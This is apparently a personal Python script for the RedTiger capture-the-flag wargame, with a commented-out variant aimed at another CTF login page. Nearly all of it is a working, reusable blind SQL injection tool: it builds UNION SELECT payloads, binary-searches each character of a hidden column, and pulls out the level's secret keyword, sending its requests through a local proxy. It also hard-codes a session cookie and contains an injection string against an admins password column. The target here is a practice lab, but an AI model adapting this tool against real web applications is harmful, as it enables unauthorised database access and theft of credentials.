import requests
from typing import Callable


#data = {"username": "' union select 'a' from admins where SUBSTRING(password, 1, 1)>'e' and '1'='1", "password":""}
proxyDict = {"http" : "127.0.0.1:8080"}
#response = requests.post("http://35.227.24.107/b54f82cece/login", data=data, proxies=proxyDict)
#print(response.text)

sqli_marker = "VULNERABLE"
cookies = {"level4login" : "put_the_kitten_on_your_head"}

class blindSQLi(object):
    def __init__(self, method: str, host: str, path: str, table: str, column: str, end: str,
                    num_fields: int, data: dict={}, quote: str="'", querystring: str="", first_val: str="", vuln_field: str=None,
                    protocol: str="https", cookies: dict={}, proxies: dict={"http" : "127.0.0.1:8080", "https" : "127.0.0.1:8080"}):
        self.method: str = method
        self.host: str = host
        self.path: str = path
        self.protocol: str = protocol
        self.proxies = proxies
        self.data: dict = data
        self.data["querystring"] = querystring
        self.quote: str = quote
        self.table: str = table   # table containing value to be leaked
        self.column: str = column # column of value to be leaked
        self.end: str = end # what to put after a payload, e.g. ';--'
        self.num_fields: int = num_fields
        self.first_val: str = first_val # placed before first quote, make 'real' select return nothing
        self.vuln_field: str = vuln_field
        self.cookies = cookies

    def url(self, qstring='') -> str:
        qstring = '?' + qstring if qstring != '' else ''
        return self.protocol + "://" + self.host + self.path + qstring
    
    def gen_condition(self, num: int, index: int, operator: str='<') -> str:
        return f"where ascii(SUBSTRING({self.column}, {index + 1}, 1)) {operator} {num}"
    
    def payload(self, condition: str) -> str:
        fields: str = ", ".join("'arg" + str(i) + "'" for i in range(self.num_fields))
        return f"{self.first_val}{self.quote} union select {fields} from {self.table} {condition}{self.end}"
    
    def send_payload(self, payload: str, vuln_field: str) -> requests.Response:
        #print("sending payload")
        new_data = self.data.copy()
        new_data[vuln_field] = new_data[vuln_field].replace(sqli_marker, payload)
        #print("sending data", new_data)
        qstring = new_data.pop("querystring")
        if self.method == "GET":
            func = requests.get
        elif self.method == "POST":
            func = requests.post
        else:
            raise Exception(f"Support for '{self.method}' not yet implemented")
        resp: requests.Response = func(self.url(qstring=qstring), data=new_data, proxies=self.proxies, cookies=self.cookies)
        return resp
    
    def eval_true_false_responses(self, vuln_field):
        true_paylod: str = self.payload("where 1=1")
        false_payload: str = self.payload("where 1=2")
        self.true_resp: requests.Response = self.send_payload(true_paylod, vuln_field)
        #print("true response")
        #print(self.true_resp.text)
        self.false_resp: requests.Response = self.send_payload(false_payload, vuln_field)
        #print("false response")
        #print(self.false_resp.text)
    
    def default_compare(self, resp: requests.Response) -> bool:
        if resp.status_code == self.true_resp.status_code and resp.text == self.true_resp.text:
            return True
        return False

    def send_val(self, index: int, num: int, vuln_field: str) -> requests.Response:
        condition: str = self.gen_condition(num, index)
        payload = self.payload(condition)
        resp = self.send_payload(payload, vuln_field)
        return resp
    
    def confirm_val(self, index: int, num: int, vuln_field: str) -> requests.Response:
        condition: str = self.gen_condition(num, index, operator="=")
        payload = self.payload(condition)
        resp = self.send_payload(payload, vuln_field)
        return resp
    
    def bsearch(self, index: int, left: int, right: int, vuln_field: str, true_func: Callable[[requests.Response], bool]) -> int:
        #print("bsearching", left, right)
        if left == right - 1:
            resp = self.confirm_val(index, left, vuln_field)
            if true_func(resp):
                return left
            else:
                raise Exception(f"No ascii value found for index {index}")
        elif right <= left:
            raise Exception(f"No ascii value found for index {index}")

        mid: int = (left + right) // 2
        resp = self.send_val(index, mid, vuln_field)
        #print(resp.text)
        if true_func(resp):
            return self.bsearch(index, left, mid, vuln_field, true_func)
        return self.bsearch(index, mid, right, vuln_field, true_func)

    def run(self, true_func: Callable[[requests.Response], bool]=None, vuln_field: str=None, max_chars: int=30) -> str:
        if vuln_field is None:
            # if no vlunerable field specified for this run, default to class' vuln field
            vuln_field = self.vuln_field
        if vuln_field is None:
            # if class also has no vuln field, manually find the marked field
            for key in self.data:
                if sqli_marker in self.data[key]:
                    vuln_field = key
                    break
        if vuln_field is None:
            raise Exception("No vulnerability marked")
        
        if true_func is None:
            self.eval_true_false_responses(vuln_field)
            true_func = self.default_compare
        
        leaked = ""
        for index in range(max_chars):
            try:
                val = self.bsearch(index, 0, 256, vuln_field, true_func)
                print(index, val, chr(val))
                leaked += chr(val)
            except Exception as e:
                print('bsearch failed on index', index, e)
                pass
        return leaked

resp = requests.post("http://redtiger.labs.overthewire.org/level4.php?id=2+union+select+keyword,1+from+level4_secret;--", proxies=proxyDict, cookies=cookies)
# print(resp.status_code)
# print(resp.text)


data = {"secretword" : "so", "go" : "Go!"}
level4 = blindSQLi("POST", "redtiger.labs.overthewire.org", "/level4.php", "level4_secret", "keyword", ";--",
                    2, data=data, quote="", querystring="id=VULNERABLE", first_val="2", protocol="http", 
                    cookies=cookies, proxies=proxyDict)

pwd = level4.run()
print(f"password is '{pwd}'")
